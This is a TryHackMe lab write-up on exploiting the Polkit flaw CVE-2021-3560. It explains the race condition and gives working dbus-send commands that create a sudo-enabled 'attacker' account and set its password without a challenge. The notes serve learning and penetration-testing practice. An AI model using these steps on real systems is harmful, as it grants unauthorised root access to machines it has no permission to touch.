# TryHackMe: Polkit

author:: Nathan Acks  
date:: 2022-02-13

## Polkit (CVE-2021-3560)

### Background

CVE-2021-3560 impacted the following distros (at the time of its announcement):

* Red Hat Enterprise Linux 8
* Fedora 21 (or later)
* Debian Testing ("Bullseye")
* Ubuntu 20.04 LTS ("Focal Fossa")

Ubuntu fixed with with version 0.105-26ubuntu1.1 of the policykit-1 package (the last vulnerable version was 0.105-26ubuntu1).

This bug is a combination of a race condition and bad error handling. Basically:

* Manually request an action that requires superuser access via DBus.
* Kill `dbus-daemon` *after* Polkit has received the message but *before* it responds (there's the race).
* Polkit requests the user ID associated with the message, but since DBus has restarted it can't reference the original message ID and responds with an error.
* Polkit mishandles the error, substituting 0 for the ID of the requesting user (there's the botched error handling).
* Because the requesting user ID now appears to be root, Polkit just goes ahead and takes the action without issuing a challenge.

The race condition is obviously kind of tricky, so best to request something that can perhaps provide some persistence, like the creation of a new user account or changing the password on an existing account.

### Exploitation Process

(0) Construct a message similar to the following:

```bash
dbus-send \
	--system \
	--dest=org.freedesktop.Accounts \
	--type=method_call \
	--print-reply /org/freedesktop/Accounts \
	              org.freedesktop.Accounts.CreateUser \
	              string:attacker \
	              string:"Pentester Account" \
	              int32:1
```

The three parameters are:

* `string:attacker` - the name of the user to create.
* `string:"Pentester Account"` - the user "description" (GECOS field).
* `int32:1` - grant sudo access to the user.

(1) Begin by determining how long the message takes to execute on the target. This can be done with the `time` command.

```bash
time dbus-send \
	--system \
	--dest=org.freedesktop.Accounts \
	--type=method_call \
	--print-reply /org/freedesktop/Accounts \
	              org.freedesktop.Accounts.CreateUser \
	              string:attacker \
	              string:"Pentester Account" \
	              int32:1
```

(3) DBus needs to be killed approximately *halfway* through this execution period. We *cannot* wait for the application to return, so instead we background it.

```bash
dbus-send \
	--system \
	--dest=org.freedesktop.Accounts \
	--type=method_call \
	--print-reply /org/freedesktop/Accounts \
	              org.freedesktop.Accounts.CreateUser \
	              string:attacker \
	              string:"Pentester Account" \
	              int32:1 & \
sleep ${TIME}s; kill $!
```

Here `$TIME` is approximately half the time measured in the previous step.

(4) ID the created user.

```bash
id attacker
```

(5) Create a new password hash for the user.

```bash
openssl passwd -6 $PASSWORD
```

(6) Pull the same trick as in step 3, but with setting the created user's password.

```bash
dbus-send \
	--system \
	--dest=org.freedesktop.Accounts \
	--type=method_call \
	--print-reply /org/freedesktop/Accounts/User$UID \
	              org.freedesktop.Accounts.User.SetPassword \
	              string:'$PASSWORD_HASH' \
	              string:'Ask the pentester' & \
sleep ${TIME}s; kill $!
```

Here `$UID` is the user ID retrieved in step 4 (note that there's *no* space between `User` and the ID, so you'll be hitting an endpoint that looks something like `/org/freedesktop/Accounts/User1003`), `$PASSWORD_HASH` is the hash returned in step 5, and `$TIME` is the same timing determined from step 3. The second `string`  being passed in the user password hint.

(7) Log in as the new user (probably via `su`).
